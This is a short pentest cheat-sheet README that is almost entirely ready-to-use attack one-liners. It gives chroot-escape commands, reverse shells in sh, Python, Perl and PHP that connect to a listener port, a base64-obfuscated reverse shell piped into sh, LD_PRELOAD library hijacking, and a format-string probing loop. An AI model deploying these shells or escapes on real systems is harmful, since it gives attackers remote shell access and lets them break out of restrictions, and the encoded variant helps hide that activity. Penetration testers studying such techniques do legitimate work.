# PTool #
The [penetration test][0] tool set.

## Cheat Sheet ##

### chroot escape ###

| binary | script                                      |
|--------|---------------------------------------------|
| find   | find -exec '/bin/sh'                        |
| awk    | awk 'BEGIN {system("/bin/sh")}'             |
| python | python -c 'import os; os.system("/bin/sh")' |

### cryptography ###

| type   | command                    | description                 |
|--------|----------------------------|-----------------------------|
| base64 | base64 -d                  | decode the Base 64 encoding |
| rot13  | tr 'A-Za-z' 'N-ZA-Mn-za-m' | rot13                       |

### reversed shell ###

shell
```sh
sh -i >& /dev/tcp/127.0.0.1/5566 0>&1
```

shell with base64 encoding
```sh
# echo -n "/bin/sh -i >& /dev/tcp/127.0.0.1/5566 0>&1" | base64 | base64 -d | sh
echo "L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNTU2NiAwPiYx" | base64 -d | sh
```

python2
```python
import socket, os;

sk = socket.create_connection(("127.0.0.1", 5566))
fd = sk.fileno()
os.popen("bash -i <&{0} >&{0} 2>&{0}".format(fd))
```

python3
```python3
import socket, os, subprocess

sk = socket.create_connection(("127.0.0.1", 5566))
fd = sk.fileno()
subprocess.Popen(["/bin/sh", "-c", f"/bin/sh -i <{fd} >&{fd} 2>&{fd}"]);
```

perl
```perl
use Socket;

socket(s, AF_INET, SOCK_STREAM, 0);
connect(s, pack_sockaddr_in(5566, inet_aton("127.0.0.1"))) or die;
open(STDIN, ">&s");
open(STDOUT, ">&s");
open(STDERR, ">&s");
exec("/bin/sh -i");
```

php
```php
<?php $sk = fsockopen("127.0.0.1", 5566); exec("/bin/bash -i <&3 >&3 2>&3"); ?>
```

### Preload ###
build and load the external .so file by `LD_PRELOAD=payload.so BIN` and the binary will call the libc function
defined in the payload.so. The payload.so file could be compiled via `gcc -shared -fPIC -o payload.so payload.c`.
Also run `LD_DEBUG=all` to show all debug message

## C / format string attack ##
quick check the address

```sh
# for n in $(seq 1 30); do ./a.out $(python -c "print(\"AAAA-${n}-%${n}\$p-%${n}\$s\")"); echo ''; done

for n in $(seq 1 30);
do
	./a.out $(python -c "print(\"AAAA-${n}-%${n}\$p-%${n}\$s\")")
	echo ''
done
```
 



[0]: https://en.wikipedia.org/wiki/Penetration_test
